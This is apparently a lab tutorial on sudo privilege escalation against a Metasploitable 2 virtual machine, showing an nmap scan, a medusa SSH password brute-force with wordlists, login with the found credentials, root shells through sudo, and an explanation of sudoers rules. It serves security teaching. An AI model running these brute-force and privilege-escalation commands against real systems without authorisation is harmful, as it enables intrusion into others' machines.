<h1 align="center"> SUDO Exploitation </h1>







## Content Tables:




## What is SUDO Exploitation?
SUDO (SuperUser DO) allows permitted users to execute commands as another user (usually root) based on security policies defined in /etc/sudoers.






# SUDO Exploitation Methodology

- In this i used with my `Metasploitable 2`.
<img width="934" height="643" alt="image" src="https://github.com/user-attachments/assets/51e59b71-b24a-4136-874f-bfc6b9f59f83" />


## Information Gathering and crack Password (SSh) target:

### Scan
- First i need to scan target:
````
nmap -sV -T4 192.168.127.0/24
````
<img width="1385" height="818" alt="image" src="https://github.com/user-attachments/assets/f0240bdf-865a-454f-8c11-faf45cefacea" />

````
nmap -sV -p 22 -T4 192.168.127.129
````
<img width="993" height="282" alt="image" src="https://github.com/user-attachments/assets/24bdbca4-4979-45ee-ba3d-05f8b58854ae" />

- Now we see the target open port `SSH` service.

### Crack Password SSH:
````
medusa -h 192.168.127.129 -U /usr/share/wordlists/user.txt -P /usr/share/wordlists/passwd.txt -M ssh -t 5 -f
````
<img width="1679" height="266" alt="image" src="https://github.com/user-attachments/assets/015efb9a-f42a-49a5-851d-868e1e15ab7e" />

- Now we got the correct `Usernmae` & `Password`.
````
Username: msfadmin
Password: msfadmin
````


- After i login to target `SSH` port:
````
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.127.129
````
<img width="1040" height="484" alt="image" src="https://github.com/user-attachments/assets/c238ec6d-9406-4f1a-a07b-2ccd4494ddd9" />

- we got success to login to Targe port `SSH`>

- Or if the server only supports DSA:
````
ssh -o HostKeyAlgorithms=+ssh-dss msfadmin@192.168.127.129
````
---





## Basic SUDO Usage:

- First to make out `terminal` can `clear terminal`: 
````
export TERM=xterm
````
<img width="498" height="93" alt="image" src="https://github.com/user-attachments/assets/20c207e1-f2b4-4f44-8cc7-4688d496b069" />


### Syntax:
````
sudo [command]
````
---


````
sudo whoami
````
<img width="429" height="88" alt="image" src="https://github.com/user-attachments/assets/e249da10-4c90-4b65-8eea-3fb42cf48e50" />

- Open shell as root
````
sudo su
````
<img width="682" height="243" alt="image" src="https://github.com/user-attachments/assets/a85bc5d0-ab6d-4197-8c24-2a65e3179034" />

- To exit this type `exit`.

````
sudo -l
````
<img width="827" height="132" alt="image" src="https://github.com/user-attachments/assets/7732fc0c-e65c-4d2f-bc18-87e6cc943efc" />

- Our result:
````
User msfadmin may run the following commands on this host:
    (ALL) ALL
````
- `(ALL)ALL`: Means:
  - The user `msfadmin` can run any command as any user (including root).
  - No restrictions are applied in the sudoers file.

- `Root` shell direct:
````
sudo /bin/bash
````
<img width="594" height="89" alt="image" src="https://github.com/user-attachments/assets/57796868-bd28-4488-bd9b-afb95a7a198e" />


````
sudo -i
````
<img width="530" height="154" alt="image" src="https://github.com/user-attachments/assets/cd66666f-22a1-45f0-9b64-a90e40a9afba" />

````
sudo bash
````
<img width="512" height="113" alt="image" src="https://github.com/user-attachments/assets/a275bc10-01e4-4316-8fc8-b73cc3b47c79" />


#### Exeecute as specific user:
````
sudo -u mysql whoami
````
<img width="699" height="126" alt="image" src="https://github.com/user-attachments/assets/5c61ce30-c7bb-4236-a8e5-7e921370a557" />


---


## Understanding SUDO Configuration
### The `/etc/sudoers` file structures:

#### User privilege specification
````
root    ALL=(ALL:ALL) ALL
````
#### Allow members of group sudo to execute any command
````
%sudo   ALL=(ALL:ALL) ALL
````
#### User-specific rules
````
alice   ALL=(ALL) NOPASSWD: /usr/bin/apt
````
#### Command-specific rules
````
bob     server1=(root) /usr/bin/systemctl restart apache2
````
#### Alias:
````
User_Alias ADMINS = alice, bob
Cmd_Alias PROCESS = /bin/kill, /usr/bin/killall
Host_Alias WEBSERVERS = server1, server2
ADMINS WEBSERVERS = (root) PROCESS
````





### Checking our SUOD Privileges:

#### Check what you can run as sudo
````
sudo -l
````
<img width="796" height="139" alt="image" src="https://github.com/user-attachments/assets/b69f8c9a-f5e7-4792-bfa1-cc8f68824583" />

- `(ALL) ALL` means:
  - The user `msfadmin` can run any command as any user (including root).
  - No restrictions are applied in the sudoers file


####  
````
sudo -L
````
<img width="1014" height="801" alt="image" src="https://github.com/user-attachments/assets/14cab90a-d5be-46e1-89c3-52ab142285ab" />

- The `sudo -L`: command lists all available Defaults options that can be configured in the `/etc/sudoers` file. These control how sudo behaves — from logging and authentication to environment handling and user experience.

- **Here are some key options from your output that matter for exploitation**:
  - `authenticate`: Requires users to authenticate before running sudo (default).
  - `rootpw`, `targetpw`, `runaspw`: Change who’s password is required — root’s, target user’s, or runas_default.
  - `requiretty`: Requires a TTY for sudo — if enabled, it blocks sudo in non-interactive shells (important for remote exploits).



#### Sample output:
````
Matching Defaults entries for alice on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on localhost:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/apt
    (root) /usr/bin/vim /etc/hosts
````


---

























